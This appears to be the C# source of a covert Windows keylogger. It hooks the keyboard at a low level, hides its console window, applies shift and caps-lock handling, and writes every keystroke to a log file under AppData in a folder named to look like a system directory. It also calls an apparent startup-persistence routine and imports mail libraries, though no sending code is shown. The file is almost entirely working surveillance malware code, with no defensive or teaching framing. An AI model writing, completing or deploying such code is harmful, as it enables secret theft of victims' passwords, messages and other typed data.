using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.IO;
using ConsoleApp2.NativeMethods;
using ConsoleApp2.Constants;
using ConsoleApp2.Startup;
using ConsoleApp2.HostInfo;

namespace ConsoleApp1
{
    class Program
    {
        #region variable declarations
        private static Mutex mutex = new Mutex();
        private static IntPtr _hookptr = IntPtr.Zero;

        // size of the keylog buffer
        private static int _bufflen = 0;
        // the buffer to which keystrokes will be written
        private static StringBuilder _buffer;
        private static StreamWriter _outfile;
        private static HostInfo hostInfo;
        private static bool lowercase;
        #endregion

        public static void Main(string[] args)
        {
            _hookptr = SetHook(KeyBoardProcCallback);
            _buffer  = new StringBuilder();
            Utils.SetConsoleWindow(Utils.ConsoleWindowState.SW_HIDE);

            _outfile = new StreamWriter(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + @"/SysWin32/logs/log.txt", true, Encoding.Unicode);

            Startup.Init();

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        /// <summary>
        ///     Register the LowLevelKeyboardProc callback function
        /// </summary>
        /// <param name="func">The callback function</param>
        /// <returns> Returns the newly created hook procedure </returns>
        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        // this is the function thats going to monitor the keyboard and write to the buffer
        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown ) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(
                        Convert.ToChar(
                            NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char)
                        )
                    );
                    DispatchKey(key, PrintableKey(vkey));
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        public static void ApplyKeyShiftModifier(ref char key) {
            key = KeyMap.keymap.ContainsKey(key) ? KeyMap.keymap[key] : Char.ToUpper(key);
        }

        public static bool PrintableKey(int vkey) {
            return !KeyMap.nonPrintableKeys.Contains(vkey);
        }

        /// <summary>
        ///     Write the buffer to the file and then after that immediately clears that buffer
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void DispatchKey(char key, bool isPrintable)
        {
            lowercase = (NativeMethods.GetKeyState(Keys.Capital) & 0x0001) != 0;

            if ((NativeMethods.GetKeyState(Keys.RShiftKey) & 0x1000) != 0 ||
                (NativeMethods.GetKeyState(Keys.LShiftKey) & 0x1000) != 0 ||
                (NativeMethods.GetKeyState(Keys.Shift)     & 0x1000) != 0) {
                lowercase = !lowercase;
            }
            if( isPrintable ) {
                if (lowercase) {
                    ApplyKeyShiftModifier(ref key);
                }
            }
            _outfile.Write(key);
            _outfile.Flush();
        }

        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}");
            Application.Exit();
        }
    }
}